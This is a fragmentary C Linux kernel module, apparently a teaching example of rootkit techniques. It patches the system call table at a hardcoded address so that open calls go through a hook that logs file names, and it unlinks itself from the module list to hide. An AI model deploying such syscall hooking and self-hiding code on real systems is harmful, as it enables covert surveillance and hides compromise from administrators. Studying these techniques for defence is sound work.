...
static unsigned long system_call_table_address = 0xffffffff818001c0;
...
asmlinkage int my_open (const char* file, int flags, int mode)
{
   ...
   printk(KERN_ALERT "mark is about to open %s\n",file);
...
shady_init_module(void)
{
 ...
 list_del_init(&__this_module.list);
  ...
  old_open = (void *)((unsigned long *) system_call_table_address)[__NR_open];
  ((unsigned long *) system_call_table_address)[__NR_open] = (unsigned long)my_open;
  return 0; /* success */		
...
{
  ((unsigned long *) system_call_table_address)[__NR_open] = (unsigned long)old_open;
